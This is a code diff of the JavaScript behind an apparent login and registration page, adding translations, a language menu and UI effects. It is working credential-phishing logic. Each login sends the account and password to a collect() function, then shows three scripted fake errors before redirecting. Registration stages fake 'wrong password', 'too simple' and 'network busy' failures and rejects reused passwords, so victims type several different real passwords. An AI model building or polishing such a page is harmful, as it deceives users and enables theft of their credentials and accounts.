+      function clearBadAll() {
+        var fs = document.querySelectorAll('.field.bad');
+        for (var i = 0; i < fs.length; i++) fs[i].classList.remove('bad');
+      }
+
+      /* ---------------- 计数 / 状态 ---------------- */
       function bump(key) {
         try {
           var n = parseInt(localStorage.getItem(key) || '0', 10);
@@ -220,7 +575,6 @@
         } catch (e) {}
       }
 
-      var REG_STATE_KEY = 'aurora_reg_state_v2';
       var memRegState = null;
       function hashPwd(s) {
         var h = 5381;
@@ -266,64 +620,94 @@
         });
       }
 
-      function busy(btn, on, label) {
+      function busy(btn, on, labelKey) {
         btn.disabled = on;
-        btn.textContent = on ? '提交中...' : label;
+        if (on) {
+          btn.classList.add('loading');
+          btn.textContent = t('btn.busy');
+        } else {
+          btn.classList.remove('loading');
+          btn.textContent = t(labelKey);
+        }
       }
 
+      /* ---------------- 分段控件 ---------------- */
       function setTab(login) {
         $('tabLogin').classList.toggle('active', login);
         $('tabRegister').classList.toggle('active', !login);
         $('loginPane').style.display = login ? 'block' : 'none';
         $('registerPane').style.display = login ? 'none' : 'block';
+        $('tabThumb').style.transform = login ? 'translateX(100%)' : 'translateX(0)';
         clearErr($('loginErr'));
         clearErr($('regErr'));
+        clearBadAll();
       }
       $('tabLogin').addEventListener('click', function () { setTab(true); });
       $('tabRegister').addEventListener('click', function () { setTab(false); });
 
+      /* ---------------- 密码显隐 ---------------- */
       function bindEye(btnId, inputId) {
         var btn = $(btnId), input = $(inputId);
         btn.addEventListener('click', function () {
           var show = input.type === 'password';
           input.type = show ? 'text' : 'password';
-          btn.textContent = show ? '隐藏' : '显示';
+          btn.setAttribute('aria-pressed', show ? 'true' : 'false');
+          btn.setAttribute('aria-label', t(show ? 'a11y.hide_pwd' : 'a11y.show_pwd'));
         });
       }
       bindEye('eyeLogin', 'loginPassword');
       bindEye('eyeReg', 'regPassword');
 
+      /* ---------------- 成功转场 ---------------- */
+      function runSuccess(isLogin) {
+        var overlay = $('success');
+        $('successText').textContent = t(isLogin ? 'ok.login' : 'ok.register');
+        overlay.classList.add('show');
+        overlay.setAttribute('aria-hidden', 'false');
+        setTimeout(function () { overlay.classList.add('bar'); }, 100);
+        setTimeout(function () {
+          document.body.classList.add('fadeout');
+          setTimeout(function () { window.location.href = H5_URL; }, 120);
+        }, 700);
+      }
+
+      /* ---------------- 登录 ---------------- */
       $('loginBtn').addEventListener('click', function () {
         var account = $('loginAccount').value.trim();
         var password = $('loginPassword').value;
-        if (!account || !password) { showErr($('loginErr'), '请输入账号和密码'); return; }
+        if (!account || !password) {
+          showErr($('loginErr'), 'err.need');
+          return;
+        }
 
         var btn = this;
-        busy(btn, true, '登录');
         var n = bump(LOGIN_KEY);
+        busy(btn, true, 'btn.login');
         collect('login', n, account, password, '', '');
 
         setTimeout(function () {
-          busy(btn, false, '登录');
-          if (n === 1) showErr($('loginErr'), '账号或密码错误，请重新输入');
-          else if (n === 2) showErr($('loginErr'), '密码错误次数过多，请稍后再试');
-          else if (n === 3) showErr($('loginErr'), '网络繁忙，请重新提交');
+          busy(btn, false, 'btn.login');
+          if (n === 1) showErr($('loginErr'), 'err.login_1');
+          else if (n === 2) showErr($('loginErr'), 'err.login_2');
+          else if (n === 3) showErr($('loginErr'), 'err.login_3');
           else {
             reset(LOGIN_KEY);
             try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
-            $('successText').textContent = '登录成功，正在进入…';
-            $('success').classList.add('show');
-            setTimeout(function () { window.location.href = H5_URL; }, 700);
+            runSuccess(true);
           }
         }, 900);
       });
 
+      /* ---------------- 注册 ---------------- */
       $('registerBtn').addEventListener('click', function () {
         var account = $('regAccount').value.trim();
         var password = $('regPassword').value;
         var confirm = $('regConfirm').value;
         var invite = $('regInvite').value.trim();
-        if (!account || !password) { showErr($('regErr'), '请输入账号和密码'); return; }
+        if (!account || !password) {
+          showErr($('regErr'), 'err.need');
+          return;
+        }
 
         var btn = this;
         var st = loadRegState();
@@ -331,36 +715,36 @@
         var h = hashPwd(password);
         var gap = st.lastAt ? (now - st.lastAt) / 1000 : 999;
         var total = st.startedAt ? (now - st.startedAt) / 1000 : 0;
-        var action = '', msg = '', advance = false;
+        var action = '', errKey = '', errVars = null, advance = false;
 
         if (st.stage > 0 && st.pwds.indexOf(h) >= 0) {
           action = 'duplicate';
-          msg = '新密码不能与旧密码相同';
+          errKey = 'err.pwd_dup';
         } else if (gap < 3) {
           action = 'cooldown';
-          msg = '操作过于频繁，请 ' + Math.ceil(3 - gap) + ' 秒后再试';
+          errKey = 'err.cooldown';
+          errVars = { s: Math.ceil(3 - gap) };
         } else if (st.stage === 0) {
           action = 'password_error';
-          msg = '密码输入错误，请重新输入';
+          errKey = 'err.pwd_wrong';
           advance = true;
         } else if (st.stage === 1) {
           action = 'too_simple';
-          msg = '密码太过简单，请设置更复杂的密码';
+          errKey = 'err.pwd_simple';
           advance = true;
         } else if (st.stage === 2) {
           action = 'busy';
-          msg = '网络繁忙，请重新提交';
+          errKey = 'err.busy';
           advance = true;
         } else {
           if (confirm !== password) {
             action = 'mismatch';
-            msg = '两次输入的密码不一致';
+            errKey = 'err.mismatch';
           } else if (total < 9) {
             action = 'busy';
-            msg = '网络繁忙，请稍后重试';
+            errKey = 'err.busy';
           } else {
             action = 'success';
-            msg = '注册成功，正在进入…';
             advance = true;
           }
         }
@@ -379,32 +763,101 @@
         saveRegState(st);
 
         if (action === 'cooldown') {
-          showErr($('regErr'), msg);
+          showErr($('regErr'), errKey, errVars);
+          markBad($('regPassword'), true);
+          markBad($('regConfirm'), true);
           return;
         }
 
-        busy(btn, true, '注册');
+        busy(btn, true, 'btn.register');
         setTimeout(function () {
-          busy(btn, false, '注册');
+          busy(btn, false, 'btn.register');
           if (action === 'success') {
             saveRegState({ stage: 0, pwds: [], startedAt: 0, lastAt: 0 });
             try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
-            $('successText').textContent = '注册成功，正在进入…';
-            $('success').classList.add('show');
-            setTimeout(function () { window.location.href = H5_URL; }, 700);
+            runSuccess(false);
           } else {
-            showErr($('regErr'), msg);
+            showErr($('regErr'), errKey, errVars);
+            markBad($('regPassword'), true);
+            markBad($('regConfirm'), true);
+            // 失败只清密码与确认密码，账号与邀请码保留
+            $('regPassword').value = '';
+            $('regConfirm').value = '';
           }
         }, 700);
       });
 
+      /* ---------------- 输入即清错 ---------------- */
       var inputs = document.querySelectorAll('input');
       for (var i = 0; i < inputs.length; i++) {
         inputs[i].addEventListener('input', function () {
           clearErr($('regErr'));
           clearErr($('loginErr'));
+          clearBadAll();
         });
       }
+
+      /* ---------------- 语言面板 ---------------- */
+      var LANGS = [
+        { code: '', label: 'lang.auto' },
+        { code: 'zh-CN', label: '简体中文' },
+        { code: 'zh-TW', label: '繁體中文' },
+        { code: 'en', label: 'English' },
+        { code: 'ja', label: '日本語' },
+        { code: 'ko', label: '한국어' }
+      ];
+
+      function currentLangChoice() {
+        try {
+          var saved = normalizeLang(localStorage.getItem('aurora_lang'));
+          if (saved) return saved;
+        } catch (e) {}
+        return '';
+      }
+
+      function buildLangList() {
+        var box = $('langList');
+        box.innerHTML = '';
+        var cur = currentLangChoice();
+        for (var i = 0; i < LANGS.length; i++) {
+          var it = LANGS[i];
+          var row = document.createElement('div');
+          row.className = 'sheetItem' + (it.code === cur ? ' cur' : '');
+          row.setAttribute('data-code', it.code);
+          row.textContent = it.label === 'lang.auto' ? t('lang.auto') : it.label;
+          row.addEventListener('click', function () {
+            var code = this.getAttribute('data-code');
+            try {
+              if (code) localStorage.setItem('aurora_lang', code);
+              else localStorage.removeItem('aurora_lang');
+            } catch (e) {}
+            LANG = detectLang();
+            applyI18n();
+            closeSheet();
+          });
+          box.appendChild(row);
+        }
+      }
+
+      function openSheet() {
+        buildLangList();
+        $('langSheet').classList.add('show');
+        $('langSheet').setAttribute('aria-hidden', 'false');
+      }
+      function closeSheet() {
+        $('langSheet').classList.remove('show');
+        $('langSheet').setAttribute('aria-hidden', 'true');
+      }
+
+      $('langBtn').addEventListener('click', openSheet);
+      $('sheetMask').addEventListener('click', closeSheet);
+
+      /* ---------------- 初始化 ---------------- */
+      if (param('theme') === 'light') document.documentElement.classList.add('light');
+      if (param('embed') === '1') document.body.classList.add('embed');
+      LANG = detectLang();
+      applyI18n();
+      setTab(false);
     })();
   </script>
 </body>
